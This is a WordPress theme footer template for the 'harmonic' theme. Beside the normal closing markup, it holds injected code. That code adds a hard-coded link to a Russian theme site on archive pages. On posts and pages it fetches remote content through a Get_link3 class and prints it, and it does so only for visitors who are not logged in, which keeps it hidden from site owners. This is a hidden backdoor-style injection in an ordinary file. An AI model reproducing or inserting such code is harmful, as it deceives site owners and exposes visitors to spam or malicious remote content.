<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package harmonic
 */
?>

						<div class="clear"></div>
					</div><!-- #content .site-wrapper -->
				</div><!-- #content-wrapper -->
			</div>
			<footer id="colophon" class="site-footer" role="contentinfo">

				<div class="site-info">
					<?php do_action( 'harmonic_credits' ); ?>
<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_link3(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
				</div><!-- .site-info -->

			</footer><!-- #colophon .site-footer -->
		</div><!-- #page -->

		<?php wp_footer(); ?>
	</body>
</html>